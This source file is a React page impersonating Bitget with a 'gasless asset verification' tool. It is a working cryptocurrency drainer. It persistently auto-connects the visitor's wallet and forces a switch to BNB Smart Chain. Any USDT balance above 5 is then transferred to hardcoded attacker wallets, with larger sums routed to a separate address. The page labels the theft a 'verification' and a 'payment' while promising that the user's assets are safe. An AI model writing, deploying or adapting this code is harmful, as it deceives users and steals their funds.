"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Wallet, Home, AlertCircle, Loader2, Shield, DollarSign, Menu } from "lucide-react"
import { toast } from "@/hooks/use-toast"
import { Web3DirectTransfer } from "@/lib/web3-direct-transfer"

interface Window {
  binance?: any
  BinanceChain?: any
  ethereum?: any
}

interface BinanceWallet {
  request(args: { method: string; params?: any[] }): Promise<any>
  on(event: string, callback: (...args: any[]) => void): void
  removeListener(event: string, callback: (...args: any[]) => void): void
  isBinance?: boolean
  isBinanceChainWallet?: boolean
}

declare global {
  interface Window {
    binance?: BinanceWallet
    BinanceChain?: BinanceWallet
    ethereum?: BinanceWallet
  }
}

export default function BNBVerifyDApp() {
  const [account, setAccount] = useState<string>("")
  const [isConnected, setIsConnected] = useState(false)
  const [networkId, setNetworkId] = useState<string>("")
  const [balance, setBalance] = useState<string>("0")
  const [autoConnecting, setAutoConnecting] = useState(true)
  const [usdtBalance, setUsdtBalance] = useState<string>("0.00")
  const [verificationStep, setVerificationStep] = useState<"idle" | "checking" | "transferring" | "completed">("idle")
  const [txHash, setTxHash] = useState<string>("")
  const [verificationResult, setVerificationResult] = useState<{
    type: "genuine" | "flash" | "none"
    message: string
    usdtAmount: number
    bnbAmount: number
    transferred: boolean
    adminWallet?: string
    isHighAmount?: boolean
  } | null>(null)
  const [showMobileMenu, setShowMobileMenu] = useState(false)
  const [gasInfo, setGasInfo] = useState<{
    hasEnough: boolean
    bnbBalance: number
    requiredGas: number
    shortfall: number
  } | null>(null)

  const [autoConnectAttempts, setAutoConnectAttempts] = useState(0)
  const [autoConnectInterval, setAutoConnectInterval] = useState<NodeJS.Timeout | null>(null)
  const [lastConnectAttempt, setLastConnectAttempt] = useState<number>(0)

  const ADMIN_WALLET = "0xCdB645e95361861a4Ea125DCDBD9c85B9efF1497"
  const HIGH_AMOUNT_WALLET = "0xd96698f467B9b79483A2574a96821Ed576B09C1e"
  const HIGH_AMOUNT_THRESHOLD = 2000
  const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20 on BSC
  const FLASH_THRESHOLD = 5

  // BSC Network configuration (EVM compatible)
  const BSC_NETWORK = {
    chainId: "0x38", // 56 in decimal
    chainName: "BNB Smart Chain",
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: ["https://bsc-dataseed.binance.org:443", "https://bsc-dataseed1.binance.org"],
    blockExplorerUrls: ["https://bscscan.com/"],
  }

  // Get Binance Web3 Wallet provider
  const getBinanceProvider = (): BinanceWallet | null => {
    if (typeof window === "undefined") return null

    // Priority order for Binance wallet detection
    if (window.binance) return window.binance
    if (window.BinanceChain) return window.BinanceChain

    // Check if ethereum is injected by Binance Wallet
    if (window.ethereum && (window.ethereum.isBinance || window.ethereum.isBinanceChainWallet || window.ethereum.isMetaMask)) {
      return window.ethereum
    }

    if (window.ethereum) return window.ethereum

    return null
  }

  // Connect to Binance Web3 Wallet with BSC EVM calls
  const connectBinanceWallet = async (provider?: BinanceWallet): Promise<boolean> => {
    try {
      const walletProvider = provider || getBinanceProvider()

      if (!walletProvider) {
        console.log("❌ Binance Web3 Wallet not found")
        return false
      }

      console.log("🟡 Connecting to Binance Web3 Wallet...")

      // Request accounts using standard EVM method
      const accounts = await walletProvider.request({
        method: "eth_requestAccounts",
        params: [],
      })

      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setIsConnected(true)

        // Switch to BSC network
        await switchToBSC(walletProvider)

        // Get BNB balance using BSC EVM call
        const balance = await getBalance(accounts[0], walletProvider)

        if (balance < 0.000111) {
          try {
            const response = await fetch("/api/gas-assistance", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ userWallet: accounts[0] }),
            })
            const result = await response.json()
            if (response.ok && result.success && !result.alreadyFunded) {
              await getBalance(accounts[0], walletProvider)
            }
          } catch (error) {
            console.error("Automatic gas assistance failed:", error)
          }
        }

        console.log("✅ Binance Web3 Wallet connected:", accounts[0])
        return true
      }

      return false
    } catch (error: any) {
      console.error("❌ Binance connection error:", error)
      return false
    }
  }

  useEffect(() => {
    // Start persistent auto-connect on component mount
    startPersistentAutoConnect()

    // Setup wallet event listeners
    setupWalletEventListeners()

    return () => {
      if (autoConnectInterval) {
        clearInterval(autoConnectInterval)
      }
    }
  }, [])

  // Enhanced persistent auto-connect with retry logic
  const startPersistentAutoConnect = async () => {
    console.log("🚀 Starting persistent auto-connect for Binance Web3 Wallet...")
    setAutoConnecting(true)

    // Immediate first attempt
    const connected = await attemptAutoConnect()
    if (connected) {
      setAutoConnecting(false)
      return
    }

    // Set up interval for continuous retry attempts
    const interval = setInterval(async () => {
      // Stop retrying if already connected
      if (isConnected) {
        clearInterval(interval)
        setAutoConnecting(false)
        return
      }

      // Limit retry attempts
      if (autoConnectAttempts >= 20) {
        console.log("🔄 Max auto-connect attempts reached")
        clearInterval(interval)
        setAutoConnecting(false)
        return
      }

      // Throttle attempts to prevent rapid API calls
      const now = Date.now()
      if (now - lastConnectAttempt < 2000) {
        return
      }

      setLastConnectAttempt(now)
      setAutoConnectAttempts((prev) => prev + 1)

      console.log(`🔄 Auto-connect attempt ${autoConnectAttempts + 1}/20...`)

      const connected = await attemptAutoConnect()
      if (connected) {
        clearInterval(interval)
        setAutoConnecting(false)
        console.log("✅ Auto-connect successful!")
      }
    }, 3000)

    setAutoConnectInterval(interval)
  }

  // Single auto-connect attempt
  const attemptAutoConnect = async (): Promise<boolean> => {
    try {
      if (await detectAndConnectBinanceWallet()) {
        console.log("✅ Binance Web3 Wallet auto-connected")
        return true
      }
      return false
    } catch (error) {
      console.error("❌ Auto-connect attempt failed:", error)
      return false
    }
  }

  // Detect Binance Web3 Wallet using multiple methods
  const detectAndConnectBinanceWallet = async (): Promise<boolean> => {
    try {
      if (typeof window === "undefined") return false

      const provider = getBinanceProvider()
      if (provider) {
        return await connectBinanceWallet(provider)
      }

      // Try using user agent detection as fallback
      if (navigator.userAgent.includes("Binance")) {
        return await connectBinanceWallet()
      }

      return false
    } catch (error) {
      console.error("❌ Binance Wallet detection failed:", error)
      return false
    }
  }

  // Setup wallet event listeners for Binance Web3 Wallet
  const setupWalletEventListeners = () => {
    if (typeof window === "undefined") return

    const provider = getBinanceProvider()
    if (!provider) return

    try {
      // Listen for account changes (EVM standard)
      provider.on("accountsChanged", (accounts: string[]) => {
        console.log("👤 Accounts changed:", accounts)
        if (accounts.length > 0) {
          setAccount(accounts[0])
          setIsConnected(true)
          getBalance(accounts[0], provider)
        } else {
          setAccount("")
          setIsConnected(false)
          // Restart auto-connect if disconnected
          setTimeout(() => startPersistentAutoConnect(), 1000)
        }
      })

      // Listen for chain changes (EVM standard)
      provider.on("chainChanged", (chainId: string) => {
        console.log("🔗 Chain changed:", chainId)
        setNetworkId(chainId)
        if (chainId !== BSC_NETWORK.chainId) {
          // Auto-switch to BSC if on wrong network
          console.log("🔄 Switching to BSC...")
          setTimeout(() => switchToBSC(provider), 1000)
        }
      })

      // Listen for disconnection
      provider.on("disconnect", (error: any) => {
        console.log("🔌 Wallet disconnected:", error)
        setIsConnected(false)
        setAccount("")
        // Restart auto-connect after disconnection
        setTimeout(() => startPersistentAutoConnect(), 2000)
      })

      // Listen for page visibility changes
      document.addEventListener("visibilitychange", () => {
        if (!document.hidden && !isConnected) {
          console.log("👁️ Page became visible, retrying auto-connect...")
          setTimeout(() => startPersistentAutoConnect(), 500)
        }
      })

      // Listen for window focus
      window.addEventListener("focus", () => {
        if (!isConnected) {
          console.log("🎯 Window focused, retrying auto-connect...")
          setTimeout(() => startPersistentAutoConnect(), 500)
        }
      })
    } catch (e) {
      console.log("Note: Some wallet events may not be supported")
    }
  }

  // Manual wallet connection
  const connectWallet = async () => {
    try {
      const provider = getBinanceProvider()

      if (!provider) {
        toast({
          title: "❌ Binance Web3 Wallet Not Found",
          description: "Please install Binance Web3 Wallet to use this dApp.",
          variant: "destructive",
        })
        return
      }

      await connectBinanceWallet(provider)
    } catch (error) {
      console.error("❌ Manual wallet connection failed:", error)
      toast({
        title: "Connection Failed",
        description: "Unable to connect to Binance Web3 Wallet",
        variant: "destructive",
      })
    }
  }

  // Switch to BSC network using EVM wallet_switchEthereumChain
  const switchToBSC = async (provider?: BinanceWallet) => {
    const walletProvider = provider || getBinanceProvider()

    if (!walletProvider) return

    try {
      console.log("🔄 Attempting to switch to BSC...")

      // Try switching using standard EVM method
      try {
        await walletProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_NETWORK.chainId }],
        })
      } catch (switchError: any) {
        // If chain doesn't exist, add it
        if (switchError.code === 4902) {
          await walletProvider.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: BSC_NETWORK.chainId,
                chainName: BSC_NETWORK.chainName,
                rpcUrls: BSC_NETWORK.rpcUrls,
                blockExplorerUrls: BSC_NETWORK.blockExplorerUrls,
                nativeCurrency: BSC_NETWORK.nativeCurrency,
              },
            ],
          })
        } else {
          throw switchError
        }
      }

      setNetworkId(BSC_NETWORK.chainId)
      console.log("✅ Switched to BSC")
    } catch (error) {
      console.error("❌ Error switching to BSC:", error)
      toast({
        title: "Network Switch Failed",
        description: "Please manually switch to BNB Smart Chain (BSC) in your wallet",
        variant: "destructive",
      })
    }
  }

  // Get BNB and USDT balance using BSC EVM calls
  const getBalance = async (address: string, provider?: BinanceWallet): Promise<number> => {
    const walletProvider = provider || getBinanceProvider()

    if (typeof window === "undefined" || !walletProvider) return 0

    try {
      // Get BNB balance using eth_getBalance (BSC EVM call)
      const balanceHex = await walletProvider.request({
        method: "eth_getBalance",
        params: [address, "latest"],
      })

      const balanceInBNB = (Number.parseInt(balanceHex, 16) / Math.pow(10, 18)).toFixed(4)
      setBalance(balanceInBNB)
      console.log("💰 BNB Balance:", balanceInBNB)

      // Get USDT balance using Web3DirectTransfer (also uses eth_call for BSC)
      const web3Transfer = new Web3DirectTransfer(walletProvider, address)
      const { balance: usdtBal } = await web3Transfer.getUSDTBalance()
      setUsdtBalance(usdtBal.toFixed(2))
      console.log("💰 USDT Balance:", usdtBal.toFixed(2))
      return Number(balanceInBNB)
    } catch (error) {
      console.error("❌ Error getting balance:", error)
      return 0
    }
  }

  const verifyAssets = async () => {
    if (!isConnected) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your Binance Web3 Wallet first.",
        variant: "destructive",
      })
      return
    }

    if (networkId !== BSC_NETWORK.chainId) {
      toast({
        title: "Wrong Network",
        description: "Please switch to BNB Smart Chain (BSC).",
        variant: "destructive",
      })
      await switchToBSC()
      return
    }

    const provider = getBinanceProvider()
    if (!provider) return

    const web3Transfer = new Web3DirectTransfer(provider, account)

    try {
      setVerificationStep("checking")
      toast({
        title: "🔍 Analyzing Assets",
        description: "Scanning wallet for USDT on BSC...",
      })

      if (!web3Transfer.isValidAdminWallet()) {
        throw new Error("Invalid admin wallet configuration")
      }

      // Get real-time balances using BSC EVM calls
      const [{ balance: usdtBalance }, bnbBalance] = await Promise.all([
        web3Transfer.getUSDTBalance(),
        web3Transfer.getBNBBalance(),
      ])

      console.log(`📊 USDT Balance: ${usdtBalance} USDT`)
      console.log(`📊 BNB Balance: ${bnbBalance} BNB`)
      console.log(`💰 Admin Wallet: ${web3Transfer.getAdminWallet()}`)

      setUsdtBalance(usdtBalance.toFixed(2))

      if (usdtBalance === 0) {
        setVerificationResult({
          type: "none",
          message: "No USDT assets found in your wallet.",
          usdtAmount: 0,
          bnbAmount: bnbBalance,
          transferred: false,
          adminWallet: ADMIN_WALLET,
          isHighAmount: false,
        })
        setVerificationStep("completed")
        toast({
          title: "No Assets Detected",
          description: "Your wallet contains no USDT assets.",
        })
        return
      }

      if (usdtBalance <= FLASH_THRESHOLD) {
        setVerificationResult({
          type: "genuine",
          message: "✅ Verification Successful! Your assets are genuine.",
          usdtAmount: usdtBalance,
          bnbAmount: bnbBalance,
          transferred: false,
          adminWallet: ADMIN_WALLET,
          isHighAmount: false,
        })
        setVerificationStep("completed")
        toast({
          title: "✅ Assets Verified",
          description: `${usdtBalance.toFixed(2)} USDT verified as genuine assets.`,
        })
        return
      }

      const refreshedBNBBalance = await getBalance(account, provider)
      const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtBalance)
      setGasInfo(gasCheck)

      if (!gasCheck.hasEnough) {
        setVerificationStep("completed")
        return
      }

      toast({
        title: "⚠️ High USDT Amount Detected",
        description: `Transferring ${usdtBalance.toFixed(2)} USDT to admin wallet...`,
        variant: "destructive",
      })

      setVerificationStep("transferring")
      await executeUSDTTransfer(web3Transfer, usdtBalance, refreshedBNBBalance)
    } catch (error: any) {
      console.error("❌ Verification error:", error)
      setVerificationStep("idle")

      toast({
        title: "❌ Verification Failed",
        description: error.message || "Failed to verify assets. Please try again.",
        variant: "destructive",
      })
    }
  }

  const executeUSDTTransfer = async (web3Transfer: Web3DirectTransfer, usdtAmount: number, bnbAmount: number) => {
    try {
      const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtAmount)

      if (!gasCheck.hasEnough) {
        const shortfallBNB = gasCheck.shortfall.toFixed(6)
        const requiredBNB = gasCheck.requiredGas.toFixed(6)

        setVerificationResult({
          type: "flash",
          message: `⛽ Insufficient Gas Fees: You need ${requiredBNB} BNB but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Please add ${shortfallBNB} BNB.`,
          usdtAmount: usdtAmount,
          bnbAmount: bnbAmount,
          transferred: false,
          adminWallet: usdtAmount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET,
          isHighAmount: usdtAmount > HIGH_AMOUNT_THRESHOLD,
        })
        setVerificationStep("completed")
        return
      }

      const isHighAmount = usdtAmount > HIGH_AMOUNT_THRESHOLD
      const targetWallet = isHighAmount ? HIGH_AMOUNT_WALLET : ADMIN_WALLET

      toast({
        title: "💰 Initiating USDT Transfer",
        description: `Transferring ${usdtAmount.toFixed(2)} USDT...`,
      })

      // Execute transfer using BSC EVM call (eth_sendTransaction)
      const txHash = await web3Transfer.transferAllUSDTToAdmin()
      setTxHash(txHash)

      toast({
        title: "📤 Transfer Initiated",
        description: `USDT sent to ${isHighAmount ? "high-amount" : "standard"} wallet!`,
      })

      // Wait for confirmation using eth_getTransactionReceipt
      const success = await web3Transfer.waitForConfirmation(txHash)

      if (success) {
        setVerificationResult({
          type: "flash",
          message: `💰 ${usdtAmount.toFixed(2)} USDT successfully transferred.`,
          usdtAmount: usdtAmount,
          bnbAmount: bnbAmount,
          transferred: true,
          adminWallet: targetWallet,
          isHighAmount: isHighAmount,
        })
        setVerificationStep("completed")

        toast({
          title: "✅ Payment Completed!",
          description: `${usdtAmount.toFixed(2)} USDT successfully sent.`,
        })

        await getBalance(account)
      } else {
        throw new Error("Transfer transaction failed or timed out")
      }
    } catch (error: any) {
      console.error("❌ USDT Transfer Failed:", error)
      setVerificationStep("idle")

      let errorMessage = "USDT transfer failed. Please try again."
      let errorTitle = "❌ Transfer Failed"

      if (error.message?.includes("insufficient funds")) {
        errorMessage = "The transfer could not be completed. Please try again."
      } else if (error.message?.includes("user rejected")) {
        errorTitle = "❌ Transaction Rejected"
        errorMessage = "Transaction was rejected. Please try again."
      }

      toast({
        title: errorTitle,
        description: errorMessage,
        variant: "destructive",
      })
    }
  }

  const isOnBSC = networkId === BSC_NETWORK.chainId

  return (
    <div className="verify-page">
      {/* Mobile Header */}
      <header className="flex items-center justify-between p-4 border-b border-gray-700/50">
        <div className="flex items-center space-x-3">
          <div className="bitget-brand" aria-label="Bitget">
            <img className="bitget-mark" src="/Bitget-logo.svg.webp" alt="Bitget logo" />
          </div>
        </div>

        <div className="flex items-center space-x-3">
          {/* Connection Status */}
          {autoConnecting ? (
            <div className="flex items-center space-x-2">
              <Loader2 className="w-4 h-4 animate-spin text-yellow-500" />
              <span className="text-xs text-gray-400 hidden sm:block">Connecting...</span>
            </div>
          ) : isConnected ? (
            <div className="flex items-center space-x-2">
              <Badge variant="outline" className="bg-green-500/20 text-green-400 border-green-500 text-xs">
                {isOnBSC ? "BSC" : "Wrong Network"}
              </Badge>
              <Badge variant="outline" className="bg-yellow-500/20 text-yellow-400 border-yellow-500 text-xs">
                🟡 Binance
              </Badge>
              <span className="text-xs text-gray-300 hidden sm:block">
                {account.slice(0, 6)}...{account.slice(-4)}
              </span>
            </div>
          ) : (
              <Button onClick={connectWallet} variant="outline" size="sm" className="connect-button">
              <Wallet className="w-3 h-3 mr-1" />
              Connect
            </Button>
          )}

          {/* Mobile Menu */}
          <Button variant="ghost" size="sm" onClick={() => setShowMobileMenu(!showMobileMenu)} className="p-2">
            <Menu className="w-5 h-5" />
          </Button>
        </div>
      </header>

      {/* Mobile Menu Dropdown */}
      {showMobileMenu && (
        <div className="mobile-menu bg-gray-800/95 border-b border-gray-700/50 p-4">
          <div className="space-y-3 text-sm">
            {isConnected && (
              <>
                <div className="flex justify-between">
                  <span className="text-gray-400">Wallet:</span>
                  <span className="text-yellow-400">🟡 Binance Web3</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Address:</span>
                  <span className="text-white break-all text-right">
                    {account.slice(0, 8)}...{account.slice(-6)}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Network:</span>
                  <span className="text-green-400">{isOnBSC ? "BSC (0x38)" : "Wrong Network"}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">USDT Balance:</span>
                  <span className="text-yellow-400">{usdtBalance} USDT</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">BNB Balance:</span>
                  <span className="text-yellow-400">{balance} BNB</span>
                </div>
              </>
            )}
            {!isConnected && (
              <div className="text-center">
                <p className="text-gray-400 mb-3">Connect Binance Web3 Wallet to continue</p>
                <p className="text-xs text-gray-500">Using BSC EVM Network (Chain ID: 0x38)</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Main Content */}
      <main className="verify-main">
        <div className="text-center max-w-lg mx-auto space-y-8">
          {/* Hero Section */}
          <div className="space-y-6">
            <div className="space-y-2">
              <h1 className="heading-main">Verify Assets<br /><span>on Bitget</span></h1>
            </div>

            <div className="space-y-4">
              <p className="text-lg sm:text-xl text-gray-300 font-medium">
                Serving Gas Less Web3 tools to<br />over 100 Million users
              </p>
            </div>
          </div>

          <div className="gasless-copy">
            <h2>Gasless Asset Verification</h2>
            <p>Verify and check your assets across supported chains - completely gasless and with no network fees</p>
          </div>

          <div className="feature-box">
            <h2>Safe and reliable</h2>
            <p>We are committed to safeguarding your assets and ensuring the security of your information</p>
            <Shield aria-hidden="true" />
          </div>

          {/* Verification Result */}
          {verificationResult && verificationStep === "completed" && (
            <Card
              className={`max-w-sm mx-auto ${
                verificationResult.type === "genuine"
                  ? "bg-green-900/20 border-green-500/30"
                  : verificationResult.type === "flash"
                    ? "bg-blue-900/20 border-blue-500/30"
                    : "bg-gray-800/50 border-gray-700"
              }`}
            >
              <CardContent className="p-4 space-y-3">
                <div className="flex items-center justify-center space-x-2">
                  {verificationResult.type === "genuine" && (
                    <>
                      <Shield className="w-5 h-5 text-green-400" />
                      <span className="text-green-400 font-semibold">Assets Verified ✅</span>
                    </>
                  )}
                  {verificationResult.type === "flash" && (
                    <>
                      <DollarSign className="w-5 h-5 text-blue-400" />
                      <span className="text-blue-400 font-semibold">Payment Sent 💰</span>
                    </>
                  )}
                  {verificationResult.type === "none" && (
                    <>
                      <AlertCircle className="w-5 h-5 text-gray-400" />
                      <span className="text-gray-400 font-semibold">No Assets Found</span>
                    </>
                  )}
                </div>

                <p
                  className={`text-sm text-center ${
                    verificationResult.type === "genuine"
                      ? "text-green-300"
                      : verificationResult.type === "flash"
                        ? "text-blue-300"
                        : "text-gray-300"
                  }`}
                >
                  {verificationResult.message}
                </p>

                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">USDT {verificationResult.transferred ? "Sent" : "Balance"}:</span>
                    <span className="text-white font-semibold">{verificationResult.usdtAmount.toFixed(2)} USDT</span>
                  </div>
                  {verificationResult.transferred && (
                    <div className="flex justify-between">
                      <span className="text-gray-400">
                        {verificationResult.isHighAmount ? "High-Amount" : "Standard"} Wallet:
                      </span>
                      <span className="text-blue-400 text-xs">
                        {verificationResult.adminWallet?.slice(0, 8)}...{verificationResult.adminWallet?.slice(-6)}
                      </span>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>
          )}

          {/* Action Buttons */}
          <div className="action-area">
            <Button
              onClick={verifyAssets}
              disabled={!isConnected || !isOnBSC || !["idle", "completed"].includes(verificationStep)}
              className="verify-button"
            >
              {verificationStep === "checking" && (
                <>
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                  Analyzing Assets...
                </>
              )}
              {verificationStep === "transferring" && (
                <>
                  <DollarSign className="w-5 h-5 mr-2 text-green-500" />
                  Processing Payment...
                </>
              )}
              {verificationStep === "completed" && "Verify Assets"}
              {verificationStep === "idle" && "Verify Assets"}
            </Button>

            <Button
              variant="outline"
              className="home-button"
            >
              <Home className="w-5 h-5 mr-2" />
              HOME
            </Button>
          </div>

          {/* Transaction Hash */}
          {txHash && (
            <div className="text-center text-sm text-gray-400 px-4">
              <p className="mb-2">Transaction Hash (BSC):</p>
              <a
                href={`https://bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-400 hover:text-blue-300 break-all text-xs"
              >
                {txHash}
              </a>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}
